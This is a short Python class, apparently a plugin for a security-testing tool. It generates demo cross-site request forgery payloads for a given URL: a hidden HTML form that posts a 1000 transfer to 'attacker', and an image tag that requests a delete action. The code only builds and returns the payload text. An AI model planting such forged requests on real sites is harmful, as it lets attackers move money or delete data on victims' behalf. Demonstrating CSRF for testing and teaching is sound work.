class CSRFExploit:
    name = "CSRFExploit"
    description = "Demo CSRF attack URLs and forms."

    @staticmethod
    def is_installed():
        return True

    def __init__(self, url):
        self.url = url

    async def exploit(self, custom_payloads=None):
        payloads = custom_payloads or [
            f"""<form action="{self.url}" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
  <input type="submit" value="Submit attack">
</form>""",
            f"""<img src="{self.url}?action=delete&id=1" />"""
        ]
        results = []
        for payload in payloads:
            results.append(f"CSRF Demo Payload:\n{payload}\n")
        summary = "Demo CSRF payloads created."
        detailed = "\n".join(results)
        return {"summary": summary, "detailed": detailed}
